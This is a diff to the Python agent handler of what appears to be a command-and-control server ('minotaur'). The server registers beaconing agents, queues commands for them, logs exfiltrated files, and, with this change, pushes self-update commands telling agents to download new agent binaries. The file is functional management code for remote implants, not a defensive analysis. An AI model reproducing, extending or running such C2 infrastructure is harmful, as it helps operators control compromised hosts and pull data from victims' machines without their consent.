@@ -1,4 +1,3 @@
-# server/handlers/agent_handler.py
 import sqlite3
 import json
 import uuid
@@ -18,6 +17,7 @@ class AgentManager:
         os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
+        # Create agents table (base columns)
         c.execute('''CREATE TABLE IF NOT EXISTS agents (
             id TEXT PRIMARY KEY,
             hostname TEXT,
@@ -28,6 +28,15 @@ class AgentManager:
             last_beacon TEXT,
             status TEXT
         )''')
+        # Add missing columns if needed (migration)
+        c.execute("PRAGMA table_info(agents)")
+        columns = [col[1] for col in c.fetchall()]
+        if 'version' not in columns:
+            c.execute("ALTER TABLE agents ADD COLUMN version TEXT")
+        if 'platform' not in columns:
+            c.execute("ALTER TABLE agents ADD COLUMN platform TEXT")
+
+        # Other tables
         c.execute('''CREATE TABLE IF NOT EXISTS agent_commands (
             id TEXT PRIMARY KEY,
             agent_id TEXT,
@@ -73,7 +82,7 @@ class AgentManager:
         conn.commit()
         conn.close()
 
-    def register_agent(self, hostname, os_type, ip, arch):
+    def register_agent(self, hostname, os_type, ip, arch, version, platform):
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute('''SELECT id, first_seen FROM agents 
@@ -84,7 +93,8 @@ class AgentManager:
         now = datetime.utcnow().isoformat()
         if row:
             agent_id = row[0]
-            c.execute("UPDATE agents SET last_beacon=? WHERE id=?", (now, agent_id))
+            c.execute("UPDATE agents SET last_beacon=?, version=?, platform=? WHERE id=?",
+                      (now, version, platform, agent_id))
             conn.commit()
             conn.close()
             self.socketio.emit('new_agent', {'id': agent_id, 'hostname': hostname, 'os': os_type, 'ip': ip})
@@ -92,9 +102,9 @@ class AgentManager:
         else:
             agent_id = str(uuid.uuid4())
             c.execute('''INSERT INTO agents 
-                         (id, hostname, os, ip, arch, first_seen, last_beacon, status)
-                         VALUES (?,?,?,?,?,?,?,?)''',
-                      (agent_id, hostname, os_type, ip, arch, now, now, 'active'))
+                         (id, hostname, os, ip, arch, version, platform, first_seen, last_beacon, status)
+                         VALUES (?,?,?,?,?,?,?,?,?,?)''',
+                      (agent_id, hostname, os_type, ip, arch, version, platform, now, now, 'active'))
             conn.commit()
             conn.close()
             self.socketio.emit('new_agent', {'id': agent_id, 'hostname': hostname, 'os': os_type, 'ip': ip})
@@ -108,9 +118,10 @@ class AgentManager:
         conn.commit()
         conn.close()
 
-    def get_pending_commands(self, agent_id):
+    def get_pending_commands(self, agent_id, agent_version=None, agent_platform=None):
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
+        # Get existing pending commands
         c.execute("SELECT id, type, payload FROM agent_commands WHERE agent_id=? AND status='pending'", (agent_id,))
         rows = c.fetchall()
         commands = []
@@ -120,7 +131,28 @@ class AgentManager:
                 'type': row[1],
                 'payload': json.loads(row[2])
             })
-            c.execute("UPDATE agent_commands SET status='sent', sent_at=? WHERE id=?", (datetime.utcnow().isoformat(), row[0]))
+        # Mark them as sent
+        c.execute("UPDATE agent_commands SET status='sent', sent_at=? WHERE agent_id=? AND status='pending'",
+                  (datetime.utcnow().isoformat(), agent_id))
+
+        # Check for version update (only if we have current version table)
+        try:
+            c.execute("SELECT version FROM agent_current_version WHERE platform=?", (agent_platform,))
+            row = c.fetchone()
+            if row and row[0] != agent_version:
+                # Build download URL for the new version
+                version_dir = agent_platform.replace('/', '_')
+                filename = f"minotaur_agent_{agent_platform.replace('/', '_')}_{row[0]}{'.exe' if 'windows' in agent_platform else ''}"
+                url = f"/static/agents/versions/{version_dir}/{filename}"
+                update_cmd = {
+                    'id': str(uuid.uuid4()),
+                    'type': 'update',
+                    'payload': {'version': row[0], 'url': url}
+                }
+                commands.insert(0, update_cmd)
+        except sqlite3.OperationalError:
+            # Table doesn't exist yet – ignore
+            pass
         conn.commit()
         conn.close()
         return commands
@@ -177,18 +209,15 @@ class AgentManager:
         self.socketio.emit('exfil_received', {'agent_id': agent_id, 'file_path': file_path})
 
     def delete_agent(self, agent_id):
-        # Only mark as deleted and remove pending commands – keep all logs (results, exfil, etc.)
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("UPDATE agents SET status='deleted' WHERE id=?", (agent_id,))
-        # Delete pending commands only (optional, but keep history)
         c.execute("DELETE FROM agent_commands WHERE agent_id=? AND status='pending'", (agent_id,))
         conn.commit()
         conn.close()
         self.socketio.emit('agent_deleted', {'agent_id': agent_id})
 
     def clear_all_agents(self):
-        # WARNING: This deletes all agent records (including logs). Keep if desired.
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("DELETE FROM agents")
@@ -204,13 +233,32 @@ class AgentManager:
     def list_agents(self):
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
-        c.execute("SELECT id, hostname, os, ip, arch, first_seen, last_beacon, status FROM agents WHERE status='active' ORDER BY first_seen DESC")
+        # Ensure columns exist (should be safe)
+        try:
+            c.execute("SELECT id, hostname, os, ip, arch, version, platform, first_seen, last_beacon, status FROM agents WHERE status='active' ORDER BY first_seen DESC")
+        except sqlite3.OperationalError as e:
+            if "no such column: version" in str(e):
+                # Fallback to old schema if columns missing (should not happen after migration)
+                c.execute("SELECT id, hostname, os, ip, arch, first_seen, last_beacon, status FROM agents WHERE status='active' ORDER BY first_seen DESC")
+                rows = c.fetchall()
+                agents = []
+                for row in rows:
+                    agents.append({
+                        'id': row[0], 'hostname': row[1], 'os': row[2], 'ip': row[3],
+                        'arch': row[4], 'version': 'unknown', 'platform': 'unknown',
+                        'first_seen': row[5], 'last_beacon': row[6], 'status': row[7]
+                    })
+                conn.close()
+                return agents
+            else:
+                raise
         rows = c.fetchall()
         agents = []
         for row in rows:
             agents.append({
                 'id': row[0], 'hostname': row[1], 'os': row[2], 'ip': row[3],
-                'arch': row[4], 'first_seen': row[5], 'last_beacon': row[6], 'status': row[7]
+                'arch': row[4], 'version': row[5], 'platform': row[6],
+                'first_seen': row[7], 'last_beacon': row[8], 'status': row[9]
             })
         conn.close()
         return agents
